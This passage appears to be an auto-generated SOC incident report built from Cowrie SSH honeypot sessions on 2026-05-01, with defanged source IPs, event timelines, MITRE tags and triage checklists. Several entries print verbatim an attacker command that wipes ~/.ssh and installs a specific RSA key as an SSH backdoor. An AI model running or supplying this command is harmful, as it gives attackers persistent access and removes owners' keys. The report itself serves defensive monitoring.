| `2026-05-01 05:55:36` | `cowrie.command.failed` |
| `2026-05-01 05:55:36` | `cowrie.log.closed` |
| `2026-05-01 05:55:37` | `cowrie.session.params` |
| `2026-05-01 05:55:37` | `cowrie.command.input` |
| `2026-05-01 05:55:38` | `cowrie.session.file_download` |
| `2026-05-01 05:55:38` | `cowrie.log.closed` |
| `2026-05-01 05:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec26abcf0117

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:55 |
| **Last Seen** | 2026-05-01 05:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:55:41` | `cowrie.session.connect` |
| `2026-05-01 05:55:41` | `cowrie.client.version` |
| `2026-05-01 05:55:42` | `cowrie.client.kex` |
| `2026-05-01 05:55:43` | `cowrie.login.success` |
| `2026-05-01 05:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca97228d7a57

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:56 |
| **Last Seen** | 2026-05-01 05:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:56:38` | `cowrie.session.connect` |
| `2026-05-01 05:56:38` | `cowrie.client.version` |
| `2026-05-01 05:56:38` | `cowrie.client.kex` |
| `2026-05-01 05:56:39` | `cowrie.login.success` |
| `2026-05-01 05:56:40` | `cowrie.session.params` |
| `2026-05-01 05:56:40` | `cowrie.command.input` |
| `2026-05-01 05:56:40` | `cowrie.command.failed` |
| `2026-05-01 05:56:41` | `cowrie.log.closed` |
| `2026-05-01 05:56:41` | `cowrie.session.params` |
| `2026-05-01 05:56:41` | `cowrie.command.input` |
| `2026-05-01 05:56:42` | `cowrie.session.file_download` |
| `2026-05-01 05:56:42` | `cowrie.log.closed` |
| `2026-05-01 05:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecc41f6d66dd

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:56 |
| **Last Seen** | 2026-05-01 05:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:56:45` | `cowrie.session.connect` |
| `2026-05-01 05:56:45` | `cowrie.client.version` |
| `2026-05-01 05:56:46` | `cowrie.client.kex` |
| `2026-05-01 05:56:47` | `cowrie.login.success` |
| `2026-05-01 05:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4338cd0b1b52

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:57 |
| **Last Seen** | 2026-05-01 05:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:57:39` | `cowrie.session.connect` |
| `2026-05-01 05:57:39` | `cowrie.client.version` |
| `2026-05-01 05:57:40` | `cowrie.client.kex` |
| `2026-05-01 05:57:41` | `cowrie.login.success` |
| `2026-05-01 05:57:42` | `cowrie.session.params` |
| `2026-05-01 05:57:42` | `cowrie.command.input` |
| `2026-05-01 05:57:42` | `cowrie.command.failed` |
| `2026-05-01 05:57:42` | `cowrie.log.closed` |
| `2026-05-01 05:57:43` | `cowrie.session.params` |
| `2026-05-01 05:57:43` | `cowrie.command.input` |
| `2026-05-01 05:57:43` | `cowrie.session.file_download` |
| `2026-05-01 05:57:43` | `cowrie.log.closed` |
| `2026-05-01 05:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b831d3a93bd

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:57 |
| **Last Seen** | 2026-05-01 05:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:57:47` | `cowrie.session.connect` |
| `2026-05-01 05:57:47` | `cowrie.client.version` |
| `2026-05-01 05:57:47` | `cowrie.client.kex` |
| `2026-05-01 05:57:49` | `cowrie.login.success` |
| `2026-05-01 05:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18662736e15e

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:58 |
| **Last Seen** | 2026-05-01 05:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:58:44` | `cowrie.session.connect` |
| `2026-05-01 05:58:44` | `cowrie.client.version` |
| `2026-05-01 05:58:44` | `cowrie.client.kex` |
| `2026-05-01 05:58:46` | `cowrie.login.success` |
| `2026-05-01 05:58:47` | `cowrie.session.params` |
| `2026-05-01 05:58:47` | `cowrie.command.input` |
| `2026-05-01 05:58:47` | `cowrie.command.failed` |
| `2026-05-01 05:58:47` | `cowrie.log.closed` |
| `2026-05-01 05:58:48` | `cowrie.session.params` |
| `2026-05-01 05:58:48` | `cowrie.command.input` |
| `2026-05-01 05:58:48` | `cowrie.session.file_download` |
| `2026-05-01 05:58:48` | `cowrie.log.closed` |
| `2026-05-01 05:58:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52193dcd6f21

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:58 |
| **Last Seen** | 2026-05-01 05:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:58:52` | `cowrie.session.connect` |
| `2026-05-01 05:58:52` | `cowrie.client.version` |
| `2026-05-01 05:58:52` | `cowrie.client.kex` |
| `2026-05-01 05:58:54` | `cowrie.login.success` |
| `2026-05-01 05:58:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07dcec55540e

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 06:00 |
| **Last Seen** | 2026-05-01 06:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:00:48` | `cowrie.session.connect` |
| `2026-05-01 06:00:48` | `cowrie.client.version` |
| `2026-05-01 06:00:48` | `cowrie.client.kex` |
| `2026-05-01 06:00:50` | `cowrie.login.success` |
| `2026-05-01 06:00:50` | `cowrie.session.params` |
| `2026-05-01 06:00:50` | `cowrie.command.input` |
| `2026-05-01 06:00:50` | `cowrie.command.failed` |
| `2026-05-01 06:00:51` | `cowrie.log.closed` |
| `2026-05-01 06:00:52` | `cowrie.session.params` |
| `2026-05-01 06:00:52` | `cowrie.command.input` |
| `2026-05-01 06:00:52` | `cowrie.session.file_download` |
| `2026-05-01 06:00:52` | `cowrie.log.closed` |
| `2026-05-01 06:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3658c042c93d

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 06:00 |
| **Last Seen** | 2026-05-01 06:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:00:56` | `cowrie.session.connect` |
| `2026-05-01 06:00:56` | `cowrie.client.version` |
| `2026-05-01 06:00:56` | `cowrie.client.kex` |
| `2026-05-01 06:00:58` | `cowrie.login.success` |
| `2026-05-01 06:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941cea624855

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 06:02 |
| **Last Seen** | 2026-05-01 06:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:02:56` | `cowrie.session.connect` |
| `2026-05-01 06:02:56` | `cowrie.client.version` |
| `2026-05-01 06:02:56` | `cowrie.client.kex` |
| `2026-05-01 06:02:58` | `cowrie.login.success` |
| `2026-05-01 06:02:59` | `cowrie.session.params` |
| `2026-05-01 06:02:59` | `cowrie.command.input` |
| `2026-05-01 06:02:59` | `cowrie.command.failed` |
| `2026-05-01 06:02:59` | `cowrie.log.closed` |
| `2026-05-01 06:03:00` | `cowrie.session.params` |
| `2026-05-01 06:03:00` | `cowrie.command.input` |
| `2026-05-01 06:03:00` | `cowrie.session.file_download` |
| `2026-05-01 06:03:00` | `cowrie.log.closed` |
| `2026-05-01 06:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c6d06a372a4

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 06:03 |
| **Last Seen** | 2026-05-01 06:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:03:04` | `cowrie.session.connect` |
| `2026-05-01 06:03:04` | `cowrie.client.version` |
| `2026-05-01 06:03:04` | `cowrie.client.kex` |
| `2026-05-01 06:03:05` | `cowrie.login.success` |
| `2026-05-01 06:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78efbf17ac52

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 06:04 |
| **Last Seen** | 2026-05-01 06:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:04:00` | `cowrie.session.connect` |
| `2026-05-01 06:04:00` | `cowrie.client.version` |
| `2026-05-01 06:04:00` | `cowrie.client.kex` |
| `2026-05-01 06:04:01` | `cowrie.login.success` |
| `2026-05-01 06:04:02` | `cowrie.session.params` |
| `2026-05-01 06:04:02` | `cowrie.command.input` |
| `2026-05-01 06:04:02` | `cowrie.command.failed` |
| `2026-05-01 06:04:02` | `cowrie.log.closed` |
| `2026-05-01 06:04:03` | `cowrie.session.params` |
| `2026-05-01 06:04:03` | `cowrie.command.input` |
| `2026-05-01 06:04:04` | `cowrie.session.file_download` |
| `2026-05-01 06:04:04` | `cowrie.log.closed` |
| `2026-05-01 06:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a89ed93b5c89

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 06:04 |
| **Last Seen** | 2026-05-01 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:04:07` | `cowrie.session.connect` |
| `2026-05-01 06:04:07` | `cowrie.client.version` |
| `2026-05-01 06:04:08` | `cowrie.client.kex` |
| `2026-05-01 06:04:09` | `cowrie.login.success` |
| `2026-05-01 06:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-477f9ef94d38

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-01 06:04 |
| **Last Seen** | 2026-05-01 06:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:04:33` | `cowrie.session.connect` |
| `2026-05-01 06:04:33` | `cowrie.client.version` |
| `2026-05-01 06:04:34` | `cowrie.client.kex` |
| `2026-05-01 06:04:34` | `cowrie.login.success` |
| `2026-05-01 06:04:35` | `cowrie.session.params` |
| `2026-05-01 06:04:35` | `cowrie.command.input` |
| `2026-05-01 06:04:35` | `cowrie.command.failed` |
| `2026-05-01 06:04:35` | `cowrie.log.closed` |
| `2026-05-01 06:04:35` | `cowrie.session.params` |
| `2026-05-01 06:04:35` | `cowrie.command.input` |
| `2026-05-01 06:04:35` | `cowrie.session.file_download` |
| `2026-05-01 06:04:35` | `cowrie.log.closed` |
| `2026-05-01 06:04:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a76fb337b23

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-05-01 06:04 |
| **Last Seen** | 2026-05-01 06:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:04:38` | `cowrie.session.connect` |
| `2026-05-01 06:04:38` | `cowrie.client.version` |
| `2026-05-01 06:04:38` | `cowrie.client.kex` |
| `2026-05-01 06:04:39` | `cowrie.login.success` |
| `2026-05-01 06:04:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a05f8211efde

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 06:06 |
| **Last Seen** | 2026-05-01 06:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:06:10` | `cowrie.session.connect` |
| `2026-05-01 06:06:10` | `cowrie.client.version` |
| `2026-05-01 06:06:11` | `cowrie.client.kex` |
| `2026-05-01 06:06:12` | `cowrie.login.success` |
| `2026-05-01 06:06:13` | `cowrie.session.params` |
| `2026-05-01 06:06:13` | `cowrie.command.input` |
| `2026-05-01 06:06:13` | `cowrie.command.failed` |
| `2026-05-01 06:06:13` | `cowrie.log.closed` |
| `2026-05-01 06:06:14` | `cowrie.session.params` |
| `2026-05-01 06:06:14` | `cowrie.command.input` |
| `2026-05-01 06:06:14` | `cowrie.session.file_download` |
| `2026-05-01 06:06:14` | `cowrie.log.closed` |
| `2026-05-01 06:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a65f32e923f

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 06:06 |
| **Last Seen** | 2026-05-01 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 06:06:18` | `cowrie.session.connect` |
| `2026-05-01 06:06:18` | `cowrie.client.version` |
| `2026-05-01 06:06:18` | `cowrie.client.kex` |
| `2026-05-01 06:06:20` | `cowrie.login.success` |
| `2026-05-01 06:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8843eb6d49c

| Field | Detail |
